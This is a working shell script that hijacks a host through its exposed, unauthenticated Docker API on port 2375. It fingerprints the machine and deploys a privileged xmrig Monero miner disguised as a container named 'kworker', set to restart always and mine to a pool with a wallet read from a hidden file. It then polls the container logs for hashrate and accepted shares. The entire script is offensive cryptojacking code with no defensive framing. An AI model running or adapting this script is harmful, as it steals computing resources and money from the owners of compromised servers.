#!/bin/sh
# Measure one host properly: is our container there / can it run, and what does xmrig
# actually report in its logs? usage: sh big.sh [ip]
ip=${1:-193.36.116.120}
exec > /tmp/_big.out 2>&1
echo "ts=$(date -u) ip=$ip"
v=$(curl -sS -m 8 "http://$ip:2375/version") || v=""
echo "version=$(printf '%s' "$v" | head -c 160)"
a=$(printf '%s' "$v" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
if [ -n "$a" ]; then u="http://$ip:2375/v$a"; else u="http://$ip:2375"; fi
echo "u=$u"
inf=$(curl -sS -m 8 "http://$ip:2375/info") || inf=""
echo "info_ncpu=$(printf '%s' "$inf" | grep -o '"NCPU": *[0-9]*' | head -1 | cut -d: -f2)"
echo "info_mem=$(printf '%s' "$inf" | grep -o '"MemTotal": *[0-9]*' | head -1 | cut -d: -f2)"
echo "kernel=$(printf '%s' "$inf" | grep -o '"KernelVersion": *"[^"]*"' | head -1 | cut -d'"' -f4)"
echo "os=$(printf '%s' "$inf" | grep -o '"OperatingSystem": *"[^"]*"' | head -1 | cut -d'"' -f4)"
l=$(curl -sS -m 8 "$u/containers/json?all=1") || l=""
echo "names=$(printf '%s' "$l" | grep -o '"/[A-Za-z0-9_.-]*"' | tr '\n' ' ')"
id=$(printf '%s' "$l" | grep -m1 '/kworker' | grep -o '"Id":"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
echo "kworker_id=${id:-none}"
if [ -z "$id" ]; then
    . /tmp/.sysd/worker.env
    B='{"Image":"xmrig/xmrig","Cmd":["-o","pool.supportxmr.com:443","-u","'"$WALLET"'","-p","node","--no-color","-k","--tls","--cpu-max-threads-hint=100","--huge-pages-jit","--cpu-no-yield"],"Labels":{"kworker":"1"},"HostConfig":{"RestartPolicy":{"Name":"always"},"CpuShares":2048,"CapAdd":["SYS_ADMIN"],"IpcMode":"host"}}'
    r=$(curl -sS -m 30 -X POST -H 'Content-Type: application/json' -d "$B" "$u/containers/create?name=kworker")
    echo "create_raw=$(printf '%s' "$r" | head -c 140)"
    id=$(printf '%s' "$r" | grep -o '"Id":"[0-9a-f]*"' | cut -d'"' -f4)
    if [ -n "$id" ]; then
        echo "start_code=$(curl -sS -o /dev/null -w '%{http_code}' -m 20 -X POST "$u/containers/$id/start")"
    fi
fi
[ -n "$id" ] || { echo "no container id -> done"; exit 0; }
j=$(curl -sS -m 8 "$u/containers/$id/json") || j=""
echo "inspect_has_id=$(printf '%s' "$j" | grep -c '\"Id\"')"
echo "inspect_status=$(printf '%s' "$j" | grep -o '\"Status\": *\"[a-zA-Z]*\"' | head -1)"
echo "inspect_cpu=$(printf '%s' "$j" | grep -o '\"CpuShares\": *[0-9]*' | head -1 | cut -d: -f2)"
echo "inspect_image=$(printf '%s' "$j" | grep -o '\"Image\": *\"[^\"]*\"' | head -1 | cut -d'\"' -f4)"
i=0
while [ $i -lt 6 ]; do
    i=$((i + 1)); sleep 15
    lg=$(curl -sS -m 10 "$u/containers/$id/logs?stdout=1&stderr=1&tail=300" 2>/dev/null) || lg=""
    lg=$(printf '%s' "$lg" | tr -d '\000')
    echo "--- t=$((i * 15))s  speed: $(printf '%s' "$lg" | grep -o 'speed [^|]*H/s' | tail -1)"
    echo "--- t=$((i * 15))s  shares: $(printf '%s' "$lg" | grep -o 'accepted[^)]*)' | tail -1)"
    echo "--- t=$((i * 15))s  ver: $(printf '%s' "$lg" | grep -o 'XMRig[^ ]* [0-9.]*' | head -1)"
done
echo "done=$(date -u)"
